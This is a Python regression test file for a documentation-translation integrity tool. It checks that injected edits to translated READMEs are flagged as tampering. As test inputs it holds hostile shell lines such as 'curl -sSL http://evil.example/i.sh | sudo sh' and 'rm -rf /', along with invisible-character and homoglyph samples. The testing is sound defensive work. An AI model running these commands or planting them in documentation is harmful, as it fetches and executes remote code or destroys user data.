"""Regressions for the gap between "hash valid" and "identity correct".

Every test here is an adversarial input that koine used to accept — or
misclassify — while its own ledger held the evidence to reject it. The theme
is not cryptography: the chain, the anchor and the external verifier all held
under attack. The theme is the boundary between what koine *seals* and what
it later *consults*.
"""
from pathlib import Path

import pytest

from koine import state as st
from koine.agents import contracts
from koine.agents.orchestrator import NO_FINDINGS, run_cycle
from koine.blocks import freeze, invented_spans, split_blocks, thaw
from koine.gate import run_gate
from koine.glossary import Glossary
from koine.ledger import Ledger, verify_chain
from koine.store import Store

FENCE_SRC = ("# Guide\n\nInstall and run the suite:\n\n"
             "```bash\npip install -e .\npytest -q\n```\n\n"
             "That is the whole setup.\n")


def _build(tmp_path, source_text, translate=lambda t: "ES::" + t):
    """One clean pipeline run: source in, translated file and ledger out."""
    src = tmp_path / "README.md"
    src.write_text(source_text, encoding="utf-8")
    tr = tmp_path / "README.es.md"
    ledger = Store(tmp_path / ".koine").ledger("es")
    run_cycle(source_path=str(src), translation_file=str(tr), lang="es",
              ledger=ledger, glossary=Glossary(), translate_fn=translate,
              review_fn=lambda s, c: NO_FINDINGS)
    return src, tr, ledger


def _raws(path):
    return [b.raw for b in split_blocks(path.read_text(encoding="utf-8"))]


def _rewrite(path, raws):
    path.write_text("\n\n".join(raws) + "\n", encoding="utf-8")


def _state_of(src, tr, ledger, index):
    return next(s.state for s in st.derive_states(src, tr, "es", ledger)
                if s.block_index == index and s.side == "source")


# ---------- a sealed block koine never consulted ----------

def test_a_mirrored_fence_is_verified_not_assumed(tmp_path):
    """The gate used to print byte-identical output before and after the one
    part of a README a reader copy-pastes and runs was rewritten.

    `mirror` events carry the translation-side hash, so the ledger always had
    the evidence; `derive_states` returned NOT_TRANSLATABLE before ever
    looking at it, and `_unsourced_states` skipped the block because its index
    *is* in the placement mapping. Blind from both sides at once.
    """
    src, tr, ledger = _build(tmp_path, FENCE_SRC)
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 0

    raws = _raws(tr)
    fence = next(i for i, r in enumerate(raws) if r.startswith("```"))
    raws[fence] = "```bash\ncurl -sSL http://evil.example/i.sh | sudo sh\n```"
    _rewrite(tr, raws)

    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2
    assert st.TAMPERED in {s.state for s in st.derive_states(src, tr, "es", ledger)}
    # the chain itself was never the weak part, and must not start reporting
    # a break it cannot see: the file diverged, not the ledger
    assert verify_chain(ledger)["ok"]


def test_the_pipeline_does_not_launder_a_tampered_mirror(tmp_path):
    """Re-running the fleet must not turn the finding back into silence.

    `mirror_untranslatable` decides whether to re-copy from the ledger rather
    than from the bytes — deliberately, so a localized fence is not clobbered.
    That is fine, but it means a second cycle cannot be what clears this.
    """
    src, tr, ledger = _build(tmp_path, FENCE_SRC)
    raws = _raws(tr)
    fence = next(i for i, r in enumerate(raws) if r.startswith("```"))
    raws[fence] = "```bash\nrm -rf /\n```"
    _rewrite(tr, raws)

    run_cycle(source_path=str(src), translation_file=str(tr), lang="es",
              ledger=ledger, glossary=Glossary(),
              translate_fn=lambda t: "ES::" + t, review_fn=lambda s, c: NO_FINDINGS)
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2


def test_swapping_two_mirrored_fences_is_caught(tmp_path):
    """Identity confusion, in its purest form: A→Y and B→X exchanged with
    not one byte of either block altered.

    Every individual content hash still exists in the file, unchanged. Only
    the *relation* — which source block owns which translated block — is
    inverted, so nothing that hashes a block in isolation can see it. The
    ledger seals the pairing; the gate simply has to read it.
    """
    src, tr, ledger = _build(tmp_path, (
        "# Guide\n\nFor production:\n\n"
        "```bash\npip install koine --require-hashes\n```\n\n"
        "For local development:\n\n"
        "```bash\npip install -e . --no-verify\n```\n"))
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 0

    raws = _raws(tr)
    a, b = [i for i, r in enumerate(raws) if r.startswith("```")]
    before = sorted(raws)
    raws[a], raws[b] = raws[b], raws[a]
    _rewrite(tr, raws)
    assert sorted(_raws(tr)) == before, "the swap must not alter any content"

    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2


def test_a_block_koine_never_placed_makes_no_claim(tmp_path):
    """The fail-safe direction stays fail-safe.

    With no placement event koine has no record of the block on the
    translation side, so it must keep saying NOT_TRANSLATABLE rather than
    inventing a verdict — the same precondition `_unsourced_states` applies.
    """
    src = tmp_path / "README.md"
    src.write_text(FENCE_SRC, encoding="utf-8")
    tr = tmp_path / "README.es.md"
    tr.write_text("", encoding="utf-8")
    ledger = Store(tmp_path / ".koine").ledger("es")

    states = st.derive_states(src, tr, "es", ledger)
    fence = next(s for s in states if s.block_index == 2)
    assert fence.state == st.NOT_TRANSLATABLE


def test_a_source_fence_edited_after_mirroring_is_drift_not_silence(tmp_path):
    """A changed code sample in the source is exactly the "quietly out of
    date" failure koine exists to catch, and it used to report nothing at
    all — the translated file kept the superseded command indefinitely."""
    src, tr, ledger = _build(tmp_path, FENCE_SRC)
    src.write_text(FENCE_SRC.replace("pytest -q", "pytest -q --strict"),
                   encoding="utf-8")
    assert _state_of(src, tr, ledger, 2) == st.STALE
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 1


# ---------- staleness is not evidence about the translation ----------

def test_an_edited_source_block_cannot_mask_an_edited_translation(tmp_path):
    """Deriving STALE first and returning short-circuited the tamper check.

    Touching the source block was enough to downgrade any rewrite of the
    recorded translation from TAMPERED (exit 2, integrity) to STALE (exit 1,
    routine drift) — which the autofix path then silently overwrites, so the
    tampering was never reported as tampering at all.
    """
    src, tr, ledger = _build(tmp_path, "# Guia\n\nInstall with pip.\n\nRun pytest.\n")
    src.write_text("# Guia\n\nInstall with pip, carefully.\n\nRun pytest.\n",
                   encoding="utf-8")
    raws = _raws(tr)
    raws[1] = "Instale con `curl http://evil.example/x | sh`."
    _rewrite(tr, raws)

    assert _state_of(src, tr, ledger, 1) == st.TAMPERED
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2


@pytest.mark.parametrize("invisible, name", [
    ("​", "zero-width space"),
    (" ", "non-breaking space"),
    ("﻿", "zero-width no-break space"),
])
def test_an_invisible_source_character_does_not_downgrade_tampering(
        tmp_path, invisible, name):
    """The cheap version of the attack above: the source diff a human reviews
    is visually empty, and koine itself used to label the result "drift"."""
    body = "# Guia\n\nInstall with pip.\n\nRun pytest.\n"
    src, tr, ledger = _build(tmp_path, body)
    src.write_text(body.replace("with pip.", "with pip." + invisible),
                   encoding="utf-8")
    raws = _raws(tr)
    raws[1] = "Instale desde http://evil.example."
    _rewrite(tr, raws)

    assert _state_of(src, tr, ledger, 1) == st.TAMPERED, name
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2


def test_a_stale_source_with_an_intact_translation_is_still_only_stale(tmp_path):
    """Negative control: putting integrity first must not turn ordinary drift
    into a false integrity failure."""
    body = "# Guia\n\nInstall with pip.\n\nRun pytest.\n"
    src, tr, ledger = _build(tmp_path, body)
    src.write_text(body.replace("with pip.", "with uv."), encoding="utf-8")

    assert _state_of(src, tr, ledger, 1) == st.STALE
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 1


# ---------- the parser decides what is even looked at ----------

def test_malformed_frontmatter_does_not_swallow_prose(tmp_path):
    """Deleting one line — a frontmatter's closing delimiter — used to hand
    an unbounded run of prose to the next thematic break in the body, as a
    block that is never translated and never mentioned by the gate. The
    source doc shipped verbatim in English while koine said all current."""
    doc = ("---\ntitle: Guide\n\n# Guide\n\n"
           "Do NOT run installers from untrusted sources.\n\n---\n\nAppendix.\n")
    kinds = [b.kind for b in split_blocks(doc)]
    assert "frontmatter" not in kinds, kinds

    src, tr, ledger = _build(tmp_path, doc)
    assert "ES::Do NOT run installers from untrusted sources." in tr.read_text(
        encoding="utf-8")


def test_a_thematic_break_at_the_top_is_not_frontmatter(tmp_path):
    doc = "---\n\n# Security Policy\n\nReport issues privately.\n\n---\n\nEnd.\n"
    assert [b.kind for b in split_blocks(doc)] == ["text"] * 5


def test_well_formed_frontmatter_is_still_frontmatter():
    doc = "---\ntitle: Guide\ntags: [a, b]\n---\n\n# Guide\n\nBody.\n"
    blocks = split_blocks(doc)
    assert blocks[0].kind == "frontmatter"
    assert blocks[0].raw == "---\ntitle: Guide\ntags: [a, b]\n---"


def test_frontmatter_is_recognized_behind_a_byte_order_mark():
    """A BOM used to make `lines[0].strip()` miss the delimiter, so machine-
    facing YAML was offered to a model as translatable prose — the exact
    inverse of the swallow above, from the same three lines of parser."""
    doc = "﻿---\ntitle: Guide\n---\n\n# Guide\n\nBody.\n"
    blocks = split_blocks(doc)
    assert blocks[0].kind == "frontmatter"
    assert blocks[0].raw.startswith("﻿"), "the BOM stays in the hashed text"


# ---------- freezing is one-directional ----------

def test_a_model_cannot_invent_a_protected_span(tmp_path):
    """freeze/thaw stops a model from losing or altering a span the source
    had. It says nothing about spans the model adds, so a translator could
    append its own install command and be promoted to CURRENT."""
    def evil(template):
        return template + " Ejecute `curl -sSL http://evil.example/i.sh | sudo sh`."

    src, tr, ledger = _build(tmp_path, "# Guide\n\nInstall the package.\n",
                             translate=evil)
    assert not tr.exists() or "evil.example" not in tr.read_text(encoding="utf-8")
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 1


def test_the_rejection_names_what_was_invented(tmp_path):
    src = tmp_path / "README.md"
    src.write_text("# Guide\n\nInstall the package.\n", encoding="utf-8")
    tr = tmp_path / "README.es.md"
    ledger = Ledger(tmp_path / "led.jsonl")
    with pytest.raises(contracts.CandidateRejected) as e:
        contracts.submit_candidate(
            source_path=str(src), block_index=1, lang="es",
            translated_template="Instale el paquete `rm -rf /`.", ledger=ledger,
            glossary=Glossary(), reviewed=True, translation_file=str(tr))
    assert "`rm -rf /`" in str(e.value)


@pytest.mark.parametrize("honest", [
    "Instale el paquete y ejecute las pruebas.",
    "NOTA: revise la configuración antes de continuar.",
    "Un enfoque teórico-práctico, aplicable en producción y/o staging.",
    "Установите пакет и запустите тесты.",
])
def test_honest_prose_is_not_mistaken_for_an_invented_span(honest):
    """Negative control for the check above. All-caps words and hyphenated
    compounds are ordinary prose in many target languages, which is why
    ENV_VARS and CLI flags are left out of the invention patterns."""
    assert invented_spans(honest) == []


def test_freeze_thaw_still_round_trips_under_composition():
    """Locked in, not fixed: byte-invariance of protected spans held under
    every composition thrown at it. The check above is the missing half, not
    a replacement."""
    text = ('Vea <a href="https://ex.io/a?b=1#f">docs</a>, corra `pip install '
            '-e ".[agents]"` con API_KEY=1 sobre ./src/app.py y --verbose.')
    frozen = freeze(text)
    assert thaw(frozen, frozen.template) == text
    assert all("⟦K" not in span for span in frozen.spans)


# ---------- what is sealed must be what is read back ----------

def test_a_two_paragraph_candidate_is_refused_not_promoted(tmp_path):
    """The pipeline used to corrupt itself and then blame a human.

    A model answering a one-paragraph source with two paragraphs was promoted;
    the blank line split the text into two blocks on read-back, so the sealed
    hash matched nothing, every later placement shifted, and koine's own gate
    reported TAMPERED plus UNSOURCED — "edited outside the pipeline" about
    damage the pipeline had just done, with no way to fix it through the tool.
    """
    def chatty(template):
        return ("ES::" + template + "\n\nNota adicional del modelo."
                if "Install" in template else "ES::" + template)

    src, tr, ledger = _build(
        tmp_path, "# Guide\n\nInstall the package.\n\nRun the tests.\n",
        translate=chatty)

    assert "Nota adicional" not in tr.read_text(encoding="utf-8")
    assert _state_of(src, tr, ledger, 1) == st.UNTRANSLATED
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 1
    assert not any(s.state in (st.TAMPERED, st.UNSOURCED)
                   for s in st.derive_states(src, tr, "es", ledger))


def test_a_trailing_newline_is_absorbed_not_rejected(tmp_path):
    """Negative control: the check above must reject a second *block*, not
    punish a benign artifact. A trailing newline is what split_blocks drops
    anyway, so it is normalized to what will be read back, then sealed."""
    src, tr, ledger = _build(tmp_path, "# Guide\n\nInstall the package.\n",
                             translate=lambda t: "ES::" + t + "\n")
    assert _state_of(src, tr, ledger, 1) == st.CURRENT
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 0


def test_the_write_refuses_blocks_that_would_not_read_back(tmp_path):
    tr = tmp_path / "README.es.md"
    with pytest.raises(contracts.CandidateRejected):
        contracts._write_raws(str(tr), ["fine", "two\n\nparagraphs", "fine"])
    assert not tr.exists(), "nothing may be written when the check fails"


# ---------- prose that contains koine's own placeholder syntax ----------

def test_a_literal_placeholder_in_the_source_is_translatable(tmp_path):
    """A block containing ⟦Kn⟧ could never be translated: thaw saw a
    placeholder freeze never emitted and rejected every candidate, so the
    block stayed UNTRANSLATED and the gate stayed red with no operator
    recourse — a denial of service anyone able to edit the source could
    trigger, on this project's own documentation first of all."""
    src, tr, ledger = _build(
        tmp_path, "# Guide\n\nkoine writes spans as ⟦K0⟧ internally.\n")
    assert _state_of(src, tr, ledger, 1) == st.CURRENT
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 0


def test_a_literal_placeholder_survives_freeze_thaw_byte_exact():
    text = "The marker ⟦K0⟧ is koine's, and `code` follows."
    frozen = freeze(text)
    assert thaw(frozen, frozen.template) == text
    assert "⟦K0⟧" in frozen.spans


# ---------- concurrency: the ledger and the file are one fact ----------

def test_concurrent_submits_cannot_lose_a_placement(tmp_path, monkeypatch):
    """The lock covered `append` and left what the chain describes unprotected.

    Two writers each read the translated file, each placed a block, and the
    second write erased the first while both entries landed — producing a
    mapping with two source blocks on one translation index, the exact state
    `_place` exists to refuse, reached by a route that never consults it. The
    chain verified; the gate reported TAMPERED and named a human.
    """
    import threading

    monkeypatch.chdir(tmp_path)
    Path("README.md").write_text(
        "# Guide\n\nAlpha.\n\nBeta.\n\nGamma.\n", encoding="utf-8")
    Path("README.es.md").write_text("", encoding="utf-8")
    ledger = Store(tmp_path / ".koine").ledger("es")

    start = threading.Barrier(3)
    errors: list = []

    def submit(index):
        try:
            start.wait()
            contracts.submit_candidate(
                source_path="README.md", block_index=index, lang="es",
                translated_template=f"TRAD-{index}", ledger=ledger,
                glossary=Glossary(), reviewed=True,
                translation_file="README.es.md")
        except Exception as exc:                      # noqa: BLE001 - reported
            errors.append(repr(exc))

    threads = [threading.Thread(target=submit, args=(i,)) for i in (1, 2, 3)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == []
    mapping = contracts.block_mapping(ledger, "README.md", "es")
    assert len(set(mapping.values())) == len(mapping), "placement collided"
    assert sorted(mapping) == [1, 2, 3], "a placement was lost"
    assert _raws(Path("README.es.md")) == ["TRAD-1", "TRAD-2", "TRAD-3"]
    assert not any(s.state == st.TAMPERED for s in st.derive_states(
        "README.md", "README.es.md", "es", ledger))


def test_the_translated_file_is_replaced_not_truncated_in_place(tmp_path):
    """A partial write left a truncated translation whose every block read as
    tampered, and the anchor writer next door already used tmp+os.replace.

    Checked by inode: truncating in place keeps it, swapping a fully written
    file in does not — so this fails if the write ever goes back to being a
    non-atomic `write_text`, which is the only way the assertion can hold
    without the property holding.
    """
    tr = tmp_path / "README.es.md"
    tr.write_text("original\n", encoding="utf-8")
    before = tr.stat().st_ino

    contracts._write_raws(str(tr), ["replaced", "cleanly"])

    assert tr.read_text(encoding="utf-8") == "replaced\n\ncleanly\n"
    assert tr.stat().st_ino != before, "written in place, so a crash truncates"
    assert not list(tmp_path.glob("*.tmp")), "no temp file left behind"


# ---------- visible equality is not byte equality ----------

def test_a_homoglyph_does_not_silently_disable_a_binding_term():
    """The one place a human made a binding decision was the last place that
    should fail quietly: one Cyrillic character in the source and the term
    simply was not found, so the rule did not apply and nothing was said."""
    from koine.glossary import Entry, Glossary as G

    glossary = G([Entry(term="commit", renderings={"es": "@same"},
                        status="binding", decided_by="anna")])
    latin = "Always commit the lockfile."
    disguised = "Always coмmit the lockfile."   # Cyrillic м

    assert glossary.violations(latin, "Siempre confirme.", "es")
    findings = glossary.violations(disguised, "Siempre confirme.", "es")
    assert findings and "lookalike" in findings[0]


def test_a_decomposed_term_still_matches():
    """NFD renders identically to NFC and used to make the rule not apply."""
    import unicodedata
    from koine.glossary import Entry, Glossary as G

    glossary = G([Entry(term="función", renderings={"es": "@same"},
                        status="binding", decided_by="anna")])
    decomposed = unicodedata.normalize("NFD", "Describe the función here.")
    assert glossary.violations(decomposed, "Describe la cosa.", "es")


@pytest.mark.parametrize("text, why", [
    ("Install with pip.​", "zero-width space"),
    ("safe‮ evil", "right-to-left override"),
    ("Always coмmit the lockfile.", "Cyrillic homoglyph"),
])
def test_engineered_invisibility_is_reported(text, why):
    from koine import confusables
    assert confusables.findings(text, "source"), why


@pytest.mark.parametrize("text", [
    "café naïve",
    "日本語のドキュメント",
    "кириллица работает",
    "한국어 문서",
    "Установите пакет и запустите тесты",
    "teórico-práctico y/o staging",
])
def test_ordinary_multilingual_prose_is_not_reported(text):
    """Negative control. Whole-word Cyrillic, Japanese and Korean are ordinary
    text; only a word built from more than one writing system is a lookalike."""
    from koine import confusables
    assert confusables.findings(text, "source") == []


# ---------- the webhook stops claiming what it did not read ----------

def test_a_truncated_push_payload_does_not_produce_silence(tmp_path):
    """GitHub caps a push payload at 20 commits and gives no flag saying it
    truncated. A large push whose one relevant commit fell off matched no
    tracked path, so no doc was affected and the queue came back empty — the
    drift was on disk and was never reported."""
    import hashlib
    import hmac
    import json

    from koine import webhook as wh

    src, tr, ledger = _build(tmp_path, "# Guide\n\nOne.\n\nTwo.\n")
    (tmp_path / "README.md").write_text("# Guide\n\nOne changed.\n\nTwo.\n",
                                        encoding="utf-8")
    doc = wh.DocConfig(source="README.md", translations={"es": "README.es.md"},
                       koine_dir=".koine")
    body = json.dumps({
        "ref": "refs/heads/main", "after": "c" * 40,
        "repository": {"full_name": "o/r"},
        "commits": [{"id": f"c{i}", "modified": [f"unrelated{i}.md"]}
                    for i in range(wh.GITHUB_COMMIT_PAGE)],
    }).encode("utf-8")
    sig = "sha256=" + hmac.new(b"s", body, hashlib.sha256).hexdigest()

    result = wh.handle_push(secret="s", signature_header=sig, body=body,
                            docs=[doc], repo_root=tmp_path)
    assert result["changed_paths_complete"] is False
    assert result["work_queue"], "drift on disk must not be silently dropped"


def test_the_queue_says_which_commit_it_was_derived_from(tmp_path):
    """The queue is read off the working tree; nothing here fetches or checks
    anything out. Reporting only the event's sha attributed a disk-derived
    answer to a commit koine never read."""
    import hashlib
    import hmac
    import json

    from koine import webhook as wh

    _build(tmp_path, "# Guide\n\nOne.\n")
    git = tmp_path / ".git"
    git.mkdir()
    (git / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    (git / "refs" / "heads").mkdir(parents=True)
    (git / "refs" / "heads" / "main").write_text("a" * 40 + "\n", encoding="utf-8")

    doc = wh.DocConfig(source="README.md", translations={"es": "README.es.md"},
                       koine_dir=".koine")
    body = json.dumps({"ref": "refs/heads/main", "after": "b" * 40,
                       "repository": {"full_name": "o/r"},
                       "commits": [{"id": "b", "modified": ["README.md"]}]}
                      ).encode("utf-8")
    sig = "sha256=" + hmac.new(b"s", body, hashlib.sha256).hexdigest()

    ctx = wh.handle_push(secret="s", signature_header=sig, body=body,
                         docs=[doc], repo_root=tmp_path)["context"]
    assert ctx["event_sha"] == "b" * 40
    assert ctx["derived_from_sha"] == "a" * 40
    assert ctx["derived_matches_event"] is False


def test_an_unknowable_head_is_not_reported_as_a_match(tmp_path):
    """Only True is a positive claim: outside a git checkout koine says it
    cannot tell, rather than implying agreement."""
    from koine import webhook as wh
    assert wh.head_sha(tmp_path) is None


# ---------- exactly what the glossary compares, stated as a table ----------

def _binding(term="commit"):
    from koine.glossary import Entry, Glossary as G
    return G([Entry(term=term, renderings={"es": "@same"}, status="binding",
                    decided_by="anna")])


def _verdict(source):
    found = _binding().violations(source, "Siempre confirme.", "es")
    if not found:
        return "SILENT"
    return "LOOKALIKE" if "lookalike" in found[0] else "ENFORCED"


@pytest.mark.parametrize("source, verdict, why", [
    ("Always commit the lockfile.", "ENFORCED", "exact code points"),
    ("Always Commit the lockfile.", "SILENT", "case-sensitive, by design"),
    ("Always COMMIT the lockfile.", "SILENT", "case-sensitive, by design"),
    ("Always coмmit the lockfile.", "LOOKALIKE", "Cyrillic м"),
    ("Always ｃｏｍｍｉｔ the lockfile.", "LOOKALIKE", "fullwidth forms"),
    ("Always com​mit the lockfile.", "LOOKALIKE", "zero-width space inside"),
    ("Nothing to see here.", "SILENT", "term genuinely absent"),
])
def test_what_the_glossary_actually_compares(source, verdict, why):
    """The comparison semantics, pinned so they cannot drift silently.

    NFC-normalized exact code points for enforcement, a separate skeleton pass
    (compatibility forms + invisibles removed + curated lookalikes) to answer
    "is the term here in disguise", and no case folding — `Glossary` documents
    terms as case-sensitive and this does not quietly change that.

    The zero-width row is the one that took two passes to close: an invisible
    character inside an ASCII word defeats the literal match and is not
    mixed-script either, so both detections missed it and the binding went
    silent.
    """
    assert _verdict(source) == verdict, why


def test_a_decomposed_source_still_enforces():
    import unicodedata
    from koine.glossary import Entry, Glossary as G

    glossary = G([Entry(term="commit", renderings={"es": "@same"},
                        status="binding", decided_by="anna")])
    nfd = unicodedata.normalize("NFD", "Always commit the lockfile.")
    found = glossary.violations(nfd, "Siempre confirme.", "es")
    assert found and "must appear" in found[0]


# ---------- the protocol's own marker is not domain data ----------

def test_freeze_dissolves_the_marker_ambiguity_rather_than_carrying_it():
    """A protocol metasymbol that can also occur as domain data is a standing
    invitation for syntax to become authority. freeze resolves it by making
    the question unanswerable *and* irrelevant: a literal ⟦Kn⟧ in the source
    is itself frozen, so no literal marker survives into the template. Every
    marker a model sees is generated and maps to exactly one span, and the
    multiset check rejects any the model adds.
    """
    text = "koine writes ⟦K0⟧ and also `code` here."
    frozen = freeze(text)

    assert frozen.spans == ["⟦K0⟧", "`code`"]
    assert frozen.template == "koine writes ⟦K0⟧ and also ⟦K1⟧ here."
    assert thaw(frozen, frozen.template) == text
    # reordering is the model's prerogative and still restores byte-exact
    assert thaw(frozen, "Here ⟦K1⟧ then ⟦K0⟧.") == "Here `code` then ⟦K0⟧."
    with pytest.raises(ValueError):
        thaw(frozen, "Text ⟦K0⟧ ⟦K1⟧ ⟦K2⟧")


# ---------- the write/read transformer reaches a fixed point ----------

@pytest.mark.parametrize("seed", range(8))
def test_the_write_read_transformer_converges_in_one_step(tmp_path, seed):
    """S0 → write(S0) → S1 → write(S1) → … must reach Sn = Sn+1, fast.

    `split_blocks` is a lossy projection: inter-block whitespace is not part
    of any block, so writing normalizes it. That is tolerable only if the
    normalization is idempotent. A transformer that never settles would keep
    producing files that differ from the ones the ledger's hashes were taken
    against, and would interact with the drift and tamper states even though
    each of those is independently correct.
    """
    import random

    chunks = ["Ordinary paragraph.", "# Heading", "- item a\n- item b",
              "```py\nx = 1\n\ny = 2\n```", "| a | b |\n|---|---|",
              "> a quotation", "---", "Another paragraph with `code`."]
    separators = ["\n\n", "\n\n\n", "\n   \n", "\n\n\n\n"]

    rng = random.Random(seed)
    path = tmp_path / "doc.md"
    for _ in range(50):
        doc = (rng.choice(["", "\n", "\n\n"])
               + rng.choice(separators).join(
                   rng.sample(chunks, rng.randint(2, 5)))
               + rng.choice(["", "\n", "\n\n\n"]))
        path.write_text(doc, encoding="utf-8")

        history = [doc]
        for _ in range(4):
            contracts._write_raws(str(path), contracts._read_raws(str(path)))
            history.append(path.read_text(encoding="utf-8"))
            if history[-1] == history[-2]:
                break
        else:
            pytest.fail(f"no fixed point in 4 steps for {doc!r}: {history}")

        assert len(history) <= 3, (
            f"converged only after {len(history) - 1} writes: {doc!r}")


def test_normalization_never_changes_a_block_hash(tmp_path):
    """The projection is lossy about whitespace *between* blocks and must be
    lossless about the blocks themselves — those are what the ledger sealed."""
    path = tmp_path / "doc.md"
    path.write_text("\n\nAlpha.\n   \nBeta.\n\n\n\n```py\nx = 1\n\ny = 2\n```\n\n",
                    encoding="utf-8")
    before = [b.raw for b in split_blocks(path.read_text(encoding="utf-8"))]

    contracts._write_raws(str(path), contracts._read_raws(str(path)))

    assert [b.raw for b in split_blocks(path.read_text(encoding="utf-8"))] == before
